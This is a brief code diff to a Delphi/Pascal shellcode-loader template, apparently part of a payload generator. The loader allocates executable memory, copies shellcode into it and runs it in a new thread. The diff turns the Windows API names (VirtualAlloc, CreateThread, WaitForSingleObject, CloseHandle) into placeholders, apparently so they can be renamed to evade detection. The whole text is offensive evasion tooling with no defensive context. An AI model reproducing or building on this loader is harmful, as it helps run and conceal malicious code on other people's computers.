@@ -24,12 +24,12 @@ begin
     
     {transformers}
 
-    addr := VirtualAlloc(nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    addr := {VirtualAlloc}(nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     CopyMemory(addr,shellcode,{shellcodeSize});
-    hThread := CreateThread(nil, 0, addr, nil, 0, ThreadId);
+    hThread := {CreateThread}(nil, 0, addr, nil, 0, ThreadId);
 
-    WaitForSingleObject(hThread, INFINITE);
-    CloseHandle(hThread);
+    {WaitForSingleObject}(hThread, INFINITE);
+    {CloseHandle}(hThread);
 end;
 """
